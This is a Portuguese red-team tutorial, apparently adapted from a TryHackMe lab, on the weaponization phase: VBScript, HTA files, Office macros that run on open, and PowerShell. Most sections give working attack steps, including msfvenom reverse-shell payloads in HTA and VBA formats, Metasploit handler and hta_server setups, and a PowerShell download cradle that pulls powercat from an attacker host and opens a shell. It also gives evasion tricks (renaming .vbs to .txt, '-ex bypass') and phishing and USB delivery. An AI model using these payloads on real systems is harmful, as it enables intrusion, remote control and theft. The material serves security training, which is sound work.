<!--
title: Weaponization
desc: Processo de preparação de payloads, ofuscação de código e empacotamento de artefatos maliciosos para burlar antivírus.
tags: payloads, malware, av-bypass
readTime: 8 min
-->

<!-- ===================================== -->
<!--        WEAPONIZATION GUIDE (RED TEAM) -->
<!-- ===================================== -->

<p align="center">
  <img src="https://img.shields.io/badge/Phase-Weaponization-critical?style=for-the-badge">
  <img src="https://img.shields.io/badge/Model-Cyber%20Kill%20Chain-blue?style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Focus-Payload%20Development-red?style=flat-square">
  <img src="https://img.shields.io/badge/Techniques-LOLBINS%20%7C%20Macros%20%7C%20HTA-purple?style=flat-square">
  <img src="https://img.shields.io/badge/Discipline-Red%20Team%20Operations-black?style=flat-square">
  <img src="https://img.shields.io/badge/Objective-Initial%20Access-yellow?style=flat-square">
</p>

---

# 💣 Weaponization em Operações Ofensivas
## Guia Técnico de Criação, Customização e Entrega de Payloads

> Na cadeia de ataque, identificar uma vulnerabilidade não é suficiente.
>  
> É na fase de **Weaponization** que o atacante transforma conhecimento em capacidade ofensiva real.
>
> Aqui, técnicas, ferramentas e criatividade se combinam para criar **artefatos maliciosos capazes de contornar defesas e executar código no alvo**.
>
> Esta etapa representa a transição crítica entre:
>
> - Reconhecimento → Execução
> - Teoria → Exploração prática
>
> Para equipes de Red Team, weaponization não é apenas gerar payloads — é **adaptar ataques ao contexto do alvo**, explorando superfícies reais como usuários, sistemas operacionais e aplicações.

---

## ⚠️ Contexto Operacional

Em ambientes corporativos modernos:

- Execução de `.exe` costuma ser restrita
- Políticas de segurança bloqueiam downloads suspeitos
- Ferramentas tradicionais são monitoradas por EDR/XDR

Como resultado, atacantes utilizam:

- **Scripts nativos (VBScript, PowerShell)**
- **Documentos Office com macros (VBA)**
- **Aplicações HTML (HTA)**
- **Binários legítimos do sistema (LOLBINS)**

---
## O que é Weaponization (Arsenalização)

Weaponization é o segundo estágio do modelo Cyber Kill Chain. Nesta fase, o atacante gera e desenvolve seu próprio código malicioso usando payloads entregáveis, como documentos Word, PDFs, etc. O objetivo da fase de weaponization é usar a arma maliciosa para explorar a máquina alvo e obter acesso inicial.

A maioria das organizações utiliza sistemas Windows, tornando-os um alvo provável. As políticas de ambiente de uma organização frequentemente bloqueiam o download e execução de arquivos `.exe` para evitar violações de segurança. Portanto, os times de Red Team dependem da criação de payloads personalizados enviados através de vários canais, como campanhas de phishing, engenharia social, exploração de navegadores ou software, USB ou métodos web.

O gráfico a seguir é um exemplo de weaponization, onde um documento PDF ou Microsoft Office personalizado é usado para entregar um payload malicioso. O payload personalizado é configurado para se conectar de volta ao ambiente de comando e controle da infraestrutura do Red Team.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/734a353799fc9f3cd05bb7421ceedd00.png)

---
## Windows Scripting Host (WSH)

O Windows Scripting Host é uma ferramenta de administração nativa do Windows que executa arquivos batch para automatizar e gerenciar tarefas dentro do sistema operacional.

É um mecanismo nativo do Windows, `cscript.exe` (para scripts de linha de comando) e `wscript.exe` (para scripts com interface gráfica), que são responsáveis por executar vários scripts Microsoft Visual Basic (VBScript), incluindo `vbs` e `vbe`. É importante notar que o mecanismo VBScript em um sistema operacional Windows executa aplicações com o mesmo nível de acesso e permissão que um usuário comum; portanto, é útil para os times de Red Team.

Agora vamos escrever um código VBScript simples para criar uma caixa de mensagem do Windows que mostre a mensagem `Welcome to THM`. Certifique-se de salvar o código a seguir em um arquivo, por exemplo, `hello.vbs`.

```javascript
Dim message 
message = "Welcome to THM"
MsgBox message
```

Na primeira linha, declaramos a variável `message` usando `Dim`. Em seguida, armazenamos o valor da string `Welcome to THM` na variável `message`. Na linha seguinte, usamos a função `MsgBox` para mostrar o conteúdo da variável. Então, usamos `wscript` para executar o conteúdo de `hello.vbs`. Como resultado, uma mensagem do Windows aparecerá com a mensagem `Welcome to THM`.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f40a7711a408932981d827bfe6e522f3.png)

Agora vamos usar o VBScript para executar arquivos executáveis. O código `vbs` a seguir invoca a calculadora do Windows, provando que podemos executar arquivos `.exe` usando o mecanismo nativo do Windows (WSH).

```javascript
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
```

Criamos um objeto da biblioteca WScript usando `CreateObject` para chamar o payload de execução. Em seguida, utilizamos o método `Run` para executar o payload. Nesta tarefa, executaremos a calculadora do Windows `calc.exe`.

Para executar o arquivo vbs, podemos executá-lo usando o wscript da seguinte forma:

```shell-session
c:\Windows\System32>wscript c:\Users\thm\Desktop\payload.vbs
```

Também podemos executá-lo via cscript:

```shell-session
c:\Windows\System32>cscript.exe c:\Users\thm\Desktop\payload.vbs
```

Como resultado, a calculadora do Windows aparecerá na área de trabalho.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/8c7cbe29ee437b83a244994621cf6996.png)

**Dica adicional:** Se os arquivos VBS estiverem na lista negra, podemos renomear o arquivo para `.txt` e executá-lo usando wscript da seguinte forma:

```shell-session
c:\Windows\System32>wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
```

O resultado será exatamente o mesmo da execução dos arquivos vbs, executando o binário calc.exe.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f6d6a5f824fa64750e8b15ce6ba07a7a.png)

---
## HTML Application (HTA)

HTA significa "HTML Application". Permite criar um arquivo para download que contém todas as informações sobre como ele é exibido e renderizado. HTAs são páginas HTML dinâmicas que contêm JScript e VBScript. A ferramenta LOLBINS (Living-of-the-land Binaries) `mshta` é usada para executar arquivos HTA. Pode ser executada por si só ou automaticamente a partir do Internet Explorer.

No exemplo a seguir, usaremos um [ActiveXObject](https://en.wikipedia.org/wiki/ActiveX) em nosso payload como prova de conceito para executar `cmd.exe`. Considere o seguinte código HTML:

```html
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

Em seguida, sirva o arquivo `payload.hta` a partir de um servidor web. Isso pode ser feito na máquina atacante da seguinte forma:

```bash
python3 -m http.server 8090
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)
```

Na máquina vítima, visite o link malicioso usando Microsoft Edge: `http://10.8.232.37:8090/payload.hta`. Note que `10.8.232.37` é o endereço IP da AttackBox.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f3a719e8137e6fdca683eefbf373ea4f.png)

Quando pressionamos `Run`, o `payload.hta` é executado e então invoca o `cmd.exe`. A figura a seguir mostra que executamos o `cmd.exe` com sucesso.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/07c5180cd36650478806a1bf3d4595f2.png)

### Conexão Reversa com HTA

Podemos criar um payload de reverse shell da seguinte forma:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of hta-psh file: 7692 bytes
Saved as: thm.hta
```

Usamos o `msfvenom` do framework Metasploit para gerar um payload malicioso que se conecta de volta à máquina atacante. Usamos o payload `windows/x64/shell_reverse_tcp` para conectar ao nosso IP e porta.

Na máquina atacante, precisamos escutar a porta `443` usando `nc`. Observe que esta porta precisa de privilégios root para ser aberta, ou você pode usar uma porta diferente.

Quando a vítima visita a URL maliciosa e clica em run, obtemos a conexão de volta.

```bash
sudo nc -lvp 443
listening on [any] 443 ...
10.8.232.37: inverse host lookup failed: Unknown host
connect to [10.8.232.37] from (UNKNOWN) [10.10.201.254] 52910
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\thm\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads>
pState\Downloads>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 4:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::fce4:699e:b440:7ff3%2
   IPv4 Address. . . . . . . . . . . : 10.10.201.254
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1
```

### HTA Malicioso via Metasploit

Há outra maneira de gerar e servir arquivos HTA maliciosos usando o framework Metasploit. Primeiro, execute o Metasploit usando o comando `msfconsole -q`. Na seção de exploits, existe o `exploit/windows/misc/hta_server`, que requer selecionar e configurar informações como `LHOST`, `LPORT`, `SRVHOST`, `Payload`, e finalmente executar `exploit` para rodar o módulo.

```shell-session
sf6 > use exploit/windows/misc/hta_server
msf6 exploit(windows/misc/hta_server) > set LHOST 10.8.232.37
LHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set LPORT 443
LPORT => 443
msf6 exploit(windows/misc/hta_server) > set SRVHOST 10.8.232.37
SRVHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(windows/misc/hta_server) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/misc/hta_server) >
[*] Started reverse TCP handler on 10.8.232.37:443
[*] Using URL: http://10.8.232.37:8080/TkWV9zkd.hta
[*] Server started.
```

Na máquina vítima, quando visitamos o arquivo HTA malicioso fornecido como URL pelo Metasploit, devemos receber uma conexão reversa.

```shell-session      
user@machine$ [*] 10.10.201.254    hta_server - Delivering Payload
[*] Sending stage (175174 bytes) to 10.10.201.254
[*] Meterpreter session 1 opened (10.8.232.37:443 -> 10.10.201.254:61629) at 2021-11-16 06:15:46 -0600
msf6 exploit(windows/misc/hta_server) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : DESKTOP-1AU6NT4
OS              : Windows 10 (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x86/windows

meterpreter > shell
Process 4124 created.
Channel 1 created. Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.  

C:\app>
```

---
## Visual Basic for Application (VBA)

VBA significa Visual Basic for Applications, uma linguagem de programação da Microsoft implementada para aplicações Microsoft como Microsoft Word, Excel, PowerPoint, etc. A programação VBA permite automatizar tarefas de quase todas as interações de teclado e mouse entre um usuário e aplicações Microsoft Office.

Macros são aplicações Microsoft Office que contêm código embutido escrito em uma linguagem de programação conhecida como Visual Basic for Applications (VBA). É usado para criar funções personalizadas para acelerar tarefas manuais através da criação de processos automatizados. Uma das características do VBA é acessar a Windows Application Programming Interface (API) e outras funcionalidades de baixo nível.

Nesta seção, discutiremos o básico do VBA e as formas como o adversário usa macros para criar documentos Microsoft maliciosos.

### Configuração Inicial

Para acompanhar o conteúdo, abra o Microsoft Word 2016 no menu Iniciar. Quando aberto, feche a janela de chave do produto, pois usaremos o período de teste de sete dias.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/2ceed0307819cf06500e6524a5f632d7.png)

Em seguida, aceite o contrato de licença do Microsoft Office.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/feb2f077507c6c242658e76ee88fb544.png)

### Criando a Primeira Macro

Agora crie um novo documento em branco. Precisamos abrir o Editor Visual Basic selecionando `View` → `Macros`. A janela Macros aparece para criar nossa própria macro dentro do documento.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/5e12755e9b891865c6ef07e25047060b.png)

Na seção `Macro name`, nomeie sua macro como `THM`. Selecione na lista `Macros in` o `Document1` e finalmente selecione `Create`. Em seguida, o editor Microsoft Visual Basic for Applications aparece onde podemos escrever código VBA.

Vamos tentar mostrar uma caixa de mensagem com a seguinte mensagem: `Welcome to Weaponization Room!` usando a função `MsgBox`:

```javascript
Sub THM()
  MsgBox ("Welcome to Weaponization Room!")
End Sub
```

Execute a macro pressionando `F5` ou `Run` → `Run Sub/UserForm`.

### Execução Automática ao Abrir o Documento

Para executar o código VBA automaticamente quando o documento for aberto, podemos usar funções embutidas como `AutoOpen` e `Document_open`. Note que precisamos especificar o nome da função que deve ser executada quando o documento abrir, que no nosso caso é a função `THM`.

```javascript
Sub Document_Open()
  THM
End Sub

Sub AutoOpen()
  THM
End Sub

Sub THM()
   MsgBox ("Welcome to Weaponization Room!")
End Sub
```

### Salvando no Formato Habilitado para Macro

É importante notar que para fazer a macro funcionar, precisamos salvá-la em formato habilitado para macro, como `.doc` e `.docm`. Salve o arquivo como `Word 97-2003 Document` (onde a macro está habilitada) através de `File` → `Save Document1` e `Save as type` → `Word 97-2003 Document`.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/a5e35b7436173da709dae5695c34d4f9.png)

Feche o documento que salvamos. Se reabrirmos o arquivo, o Microsoft Word mostrará uma mensagem de segurança indicando que as macros foram desabilitadas e nos dará a opção de habilitá-las.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e140bfbce59d6cf3e71489dba094adc2.png)

Quando permitimos `Enable Content`, nossa macro é executada.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/ca228c238732dcdf21139317992a0083.png)

### Executando Arquivos com VBA

Agora edite o documento e crie uma função de macro que execute `calc.exe` ou qualquer arquivo executável como prova de conceito:

```javascript
Sub PoC()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
```

**Explicação do código:**

- `Dim payload As String`: declaramos a variável `payload` como string usando a palavra-chave `Dim`
- `payload = "calc.exe"`: especificamos o nome do payload
- `CreateObject("Wscript.Shell").Run payload`: criamos um objeto Windows Scripting Host (WSH) e executamos o payload

**Nota:** Se você renomear o nome da função, deve incluir o nome da função nas funções `AutoOpen()` e `Document_open()` também.

Teste seu código antes de salvar usando o recurso de execução no editor. Quando o código funcionar, salve o arquivo e tente abri-lo novamente.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/5c80382621d3fcb578a9e128ca821e71.png)

It is important to mention that we can combine VBAs with previously covered methods, such as HTAs and WSH. VBAs/macros by themselves do not inherently bypass any detections.

### Exemplo: Meterpreter com VBA

Agora vamos criar um payload meterpreter em memória usando o Metasploit para receber uma reverse shell.

Primeiro, na AttackBox, criamos nosso payload meterpreter usando `msfvenom`. Especificamos o `Payload`, `LHOST` e `LPORT`, que devem corresponder ao que está no Metasploit. Especificamos o payload como `vba` para usá-lo como macro.

```shell-session
user@AttackBox$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of vba file: 2698 bytes
```

**Importante:** O valor do `LHOST` acima é um exemplo do IP da AttackBox. No seu caso, especifique o IP da sua AttackBox.

**Modificação necessária:** O output funcionará em uma planilha MS Excel. Portanto, mude `Workbook_Open()` para `Document_Open()` para torná-lo adequado para documentos MS Word.

Copie o output e salve no editor de macro do documento MS Word.

### Configurando o Listener no Metasploit

Na máquina atacante, execute o Metasploit e configure o listener:

```shell-session
user@AttackBox$ msfconsole -q
msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.50.159.15
LHOST => 10.50.159.15
msf5 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf5 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.50.159.15:443 
```

Quando o documento MS Word malicioso for aberto na máquina vítima, devemos receber uma reverse shell.

```shell-session
msf5 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.50.159.15:443 
[*] Sending stage (176195 bytes) to 10.10.215.43
[*] Meterpreter session 1 opened (10.50.159.15:443 -> 10.10.215.43:50209) at 2021-12-13 10:46:05 +0000
meterpreter >
```

---
## PowerShell (PSH)

PowerShell é uma linguagem de programação orientada a objetos executada a partir do Dynamic Language Runtime (DLR) no .NET.

Os times de Red Team dependem do PowerShell para realizar várias atividades, incluindo acesso inicial, enumerações de sistema e muitos outros.

### Script Básico

Vamos começar criando um script PowerShell simples que imprime "Welcome to the Weaponization Room!":

```powershell
Write-Output "Welcome to the Weaponization Room!"
```

Salve o arquivo como `thm.ps1`. Com o `Write-Output`, imprimimos a mensagem no prompt de comando.

### Execution Policy

A execution policy do PowerShell é uma opção de segurança para proteger o sistema contra a execução de scripts maliciosos. Por padrão, a Microsoft desabilita a execução de scripts `.ps1` por razões de segurança. A execution policy do PowerShell é definida como `Restricted`, o que significa que permite comandos individuais, mas não executa scripts.

**Verificando a Execution Policy atual:**

```shell-session
PS C:\Users\thm> Get-ExecutionPolicy
Restricted
```

**Alterando a Execution Policy:**

```shell-session
PS C:\Users\thm\Desktop> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
http://go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help (default is "N"): A
```

### Bypass da Execution Policy

O Microsoft fornece maneiras de desabilitar esta restrição. Uma delas é usando a opção `-ex bypass` no comando PowerShell, que significa que nada é bloqueado ou restrito.

```shell-session
C:\Users\thm\Desktop>powershell -ex bypass -File thm.ps1
Welcome to Weaponization Room!
```

### Obtendo uma Reverse Shell com PowerCat

Agora, vamos tentar obter uma reverse shell usando uma das ferramentas escritas em PowerShell: o PowerCat.

**Na AttackBox, faça o download do PowerCat e execute um servidor web:**

```bash
git clone https://github.com/besimorhino/powercat.git
Cloning into 'powercat'...
remote: Enumerating objects: 239, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 239 (delta 0), reused 2 (delta 0), pack-reused 235
Receiving objects: 100% (239/239), 61.75 KiB | 424.00 KiB/s, done.
Resolving deltas: 100% (72/72), done.

cd powercat
python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

**Na AttackBox, escute na porta 1337 usando nc:**

```bash
nc -lvp 1337
```

**Na máquina vítima, execute o seguinte comando PowerShell:**

```shell-session
C:\Users\thm\Desktop> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
```

**Explicação do comando:**

- A máquina vítima baixa o `powercat.ps1` do servidor web da AttackBox
- Executa localmente na máquina alvo usando `cmd.exe`
- Envia uma conexão de volta para a AttackBox na porta `1337`

**Resultado esperado:**

```shell-session
nc -lvp 1337
listening on [any] 1337 ...
10.10.12.53: inverse host lookup failed: Unknown host
connect to [10.8.232.37] from (UNKNOWN) [10.10.12.53] 49804
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\thm>
```

---
## Command and Control (C2)

Esta seção introduz o conceito básico de frameworks Command and Control (C2) usados em operações de Red Team.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/9671adc6cb778fa7b151921f753e2f96.jpg)

### O que é Command and Control (C2)?

Frameworks C2 são frameworks de pós-exploração que permitem que times de Red Team colaborem e controlem máquinas comprometidas. C2 é considerada uma das ferramentas mais importantes para times de Red Team durante operações ofensivas cibernéticas.

**Frameworks C2 fornecem abordagens rápidas e diretas para:**

- Gerar vários payloads maliciosos
- Enumerar a máquina/redes comprometidas
- Realizar escalonamento de privilégios e pivoting
- Movimento lateral
- E muitos outros

### Frameworks C2 Populares

#### Cobalt Strike

Cobalt Strike é um framework comercial focado em Adversary Simulations e Red Team Operations. É uma combinação de ferramentas de acesso remoto, capacidades de pós-exploração e um sistema de relatórios único. Fornece um agente com técnicas avançadas para estabelecer comunicações encobertas e realizar várias operações, incluindo keylogging, upload e download de arquivos, implantação de VPN, técnicas de escalonamento de privilégios, mimikatz, varredura de portas e os movimentos laterais mais avançados.

#### PowerShell Empire

PowerShell Empire é um framework open-source que ajuda operadores de Red Team e testadores de penetração a colaborar entre múltiplos servidores usando chaves e senhas compartilhadas. É um framework de exploração baseado em agentes PowerShell e Python. PowerShell Empire foca em exploração client-side e pós-exploração de ambientes Windows e Active Directory.

#### Metasploit

Metasploit é um framework de exploração amplamente utilizado que oferece várias técnicas e ferramentas para realizar hacking facilmente. É um framework open-source e é considerado uma das principais ferramentas para pentesting e operações de Red Team. Metasploit é uma das ferramentas que usamos neste laboratório para gerar payloads para nossa fase de weaponization.

---
## Técnicas de Entrega (Delivery Techniques)

Técnicas de entrega são um dos fatores importantes para obter acesso inicial. Elas precisam parecer profissionais, legítimas e convincentes para a vítima.

### Email Delivery

É um método comum para enviar o payload através de um email de phishing com um link ou anexo. Este método anexa um arquivo malicioso que pode ser dos tipos mencionados anteriormente. O objetivo é convencer a vítima a visitar um site malicioso ou baixar e executar o arquivo malicioso para obter acesso inicial à rede ou host da vítima.

Os times de Red Team devem ter sua própria infraestrutura para fins de phishing. Dependendo dos requisitos do engajamento, pode ser necessário configurar várias opções no servidor de email, incluindo DomainKeys Identified Mail (DKIM), Sender Policy Framework (SPF) e DNS Pointer (PTR) record.

Os times de Red Team também podem usar serviços de email de terceiros com boa reputação, como Google Gmail, Outlook, Yahoo, entre outros.

Outro método interessante seria usar uma conta de email comprometida dentro de uma empresa para enviar emails de phishing dentro da empresa ou para outros. O email comprometido pode ser hackeado por phishing ou por outras técnicas, como ataques de password spraying.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/54108dbd9d1c3d64fb86f2ad04b5949e.png)

### Web Delivery

Outro método é hospedar payloads maliciosos em um servidor web controlado pelos times de Red Team. O servidor web deve seguir diretrizes de segurança, como um histórico limpo e reputação de seu nome de domínio e certificado TLS (Transport Layer Security).

Este método inclui outras técnicas, como engenharia social para convencer a vítima a visitar ou baixar o arquivo malicioso. Um encurtador de URL pode ser útil ao usar este método.

Neste método, outras técnicas podem ser combinadas e usadas. O atacante pode aproveitar exploits de dia-zero, como explorar software vulnerável como Java ou navegadores, para usá-los em emails de phishing ou técnicas de entrega web para obter acesso à máquina da vítima.
![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/08a3f660501cf5171277534e40aa96b8.png)

### USB Delivery

Este método requer que a vítima conecte fisicamente o USB malicioso. Este método pode ser eficaz e útil em conferências ou eventos onde o adversário pode distribuir o USB. (Referência: [MITRE ATT&CK T1091](https://attack.mitre.org/techniques/T1091/))

Frequentemente, organizações estabelecem políticas fortes, como desabilitar o uso de USB em seu ambiente organizacional por razões de segurança. Enquanto outras organizações permitem no ambiente alvo.

**Ataques USB comuns usados para weaponization de dispositivos USB incluem:**

- [Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky-deluxe)
- [USBHarpoon](https://www.minitool.com/news/usbharpoon.html)
- Cabos USB de carregamento, como o [O.MG Cable](https://shop.hak5.org/products/omg-cable)

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/ff8ca3c104fa32e30603ecf97ee0d72e.png)

---
## Conclusão

A fase de **Weaponization** representa um elo crítico entre a descoberta de vulnerabilidades e a obtenção de acesso inicial em um ambiente alvo. Como demonstrado ao longo deste documento, o processo de transformar uma vulnerabilidade identificada em uma arma funcional requer conhecimento técnico diversificado e criatividade.

### Principais Aprendizados

**1. Diversidade de Vetores de Ataque**

- Desde scripts VBS/WScript nativos do Windows até documentos Office com macros maliciosas
- Arquivos HTA aproveitando navegadores e o interpretador `mshta`
- PowerShell como ferramenta poderosa para execução de payloads e bypass de restrições

**2. Flexibilidade dos Payloads**

- A mesma técnica (ex: VBA) pode ser usada tanto para provas de conceito simples (calc.exe) quanto para shells reversas completas
- Ferramentas como msfvenom permitem gerar payloads em múltiplos formatos a partir de uma única especificação

**3. Evasão de Defesas**

- Bypass de Execution Policy do PowerShell com `-ex bypass`
- Renomeação de extensões de arquivo (`.vbs` para `.txt`) para contornar blacklists
- Uso de mecanismos nativos do Windows (LOLBINS) para reduzir detecção

**4. Métodos de Entrega**

- Email phishing com anexos ou links
- Servidores web controlados pelo atacante
- Dispositivos USB físicos (em cenários de acesso físico)

**5. Infraestrutura de C2**

- Frameworks como Metasploit, Cobalt Strike e PowerShell Empire fornecem a espinha dorsal para operações pós-exploração
- A integração entre geração de payload, entrega e C2 é essencial para operações eficientes

### Considerações Finais

A weaponization eficaz não depende apenas de ferramentas sofisticadas, mas principalmente da **capacidade de adaptação ao ambiente alvo**. O que funciona em um contexto pode falhar em outro devido a políticas de segurança, versões de software ou treinamento dos usuários.

Para profissionais de segurança ofensiva (Red Team), dominar estas técnicas é fundamental para:

- Simular ameaças realistas
- Testar a eficácia dos controles de segurança
- Identificar gaps nas políticas organizacionais

Para profissionais de segurança defensiva (Blue Team), compreender estas técnicas permite:

- Implementar controles mais eficazes
- Desenvolver regras de detecção precisas
- Criar programas de conscientização mais relevantes
